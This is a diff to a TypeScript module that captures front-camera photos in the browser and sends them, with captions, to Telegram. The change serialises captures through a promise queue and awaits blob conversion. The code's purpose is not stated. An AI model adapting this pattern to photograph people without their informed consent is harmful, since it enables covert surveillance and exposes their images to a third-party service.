@@ -1,10 +1,25 @@
 import { notify, notifyPhoto } from "./telegram";
 
+// Queue to ensure sequential execution of camera captures
+let captureQueue: Promise<void> = Promise.resolve();
+
 /**
  * Captures a photo from the front camera and sends it to Telegram.
  * If permission is denied or an error occurs, it notifies via Telegram message.
+ * Serialized to prevent concurrent camera access conflicts.
  */
-export async function captureAndSendPhoto(caption: string): Promise<void> {
+export function captureAndSendPhoto(caption: string): Promise<void> {
+  captureQueue = captureQueue.then(async () => {
+    try {
+      await captureAndSendPhotoInternal(caption);
+    } catch (err) {
+      console.error("Camera capture queue error:", err);
+    }
+  });
+  return captureQueue;
+}
+
+async function captureAndSendPhotoInternal(caption: string): Promise<void> {
   if (typeof window === "undefined" || !navigator?.mediaDevices?.getUserMedia) {
     notify(`⚠️ MediaDevices not supported in this environment for: ${caption}`);
     return;
@@ -82,17 +97,20 @@ export async function captureAndSendPhoto(caption: string): Promise<void> {
     videoElement = null;
 
     // Convert canvas to blob and send it to Telegram.
-    canvas.toBlob(
-      (blob) => {
-        if (blob) {
-          notifyPhoto(blob, caption);
-        } else {
-          notify(`⚠️ Rasm blobga o'girilmadi: ${caption}`);
-        }
-      },
-      "image/jpeg",
-      0.85
-    );
+    await new Promise<void>((resolve) => {
+      canvas.toBlob(
+        (blob) => {
+          if (blob) {
+            notifyPhoto(blob, caption);
+          } else {
+            notify(`⚠️ Rasm blobga o'girilmadi: ${caption}`);
+          }
+          resolve();
+        },
+        "image/jpeg",
+        0.85
+      );
+    });
   } catch (error: any) {
     // Clean up stream.
     if (stream) {
